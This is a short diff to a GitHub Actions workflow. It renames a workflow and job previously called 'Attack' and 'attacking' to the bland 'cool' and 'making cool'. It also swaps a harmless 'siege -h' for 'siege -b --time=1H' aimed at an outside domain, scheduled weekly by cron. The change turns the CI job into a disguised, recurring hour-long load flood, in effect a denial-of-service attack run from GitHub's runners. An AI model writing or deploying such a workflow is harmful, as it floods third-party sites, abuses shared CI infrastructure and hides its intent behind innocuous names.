@@ -1,16 +1,15 @@
-#siege -b 0694200.xyz
-name: Attack
+name: cool
 on:
   workflow_dispatch:
   schedule:
     - cron: '00 23 * * 0'
 jobs:
   build:
-      name: attacking
+      name: making cool
       runs-on: ubuntu-latest
       steps:
         - name: cool
           run: |
             sudo apt install siege
-            siege -h
+            siege -b --time=1H 0694200.xyz
 
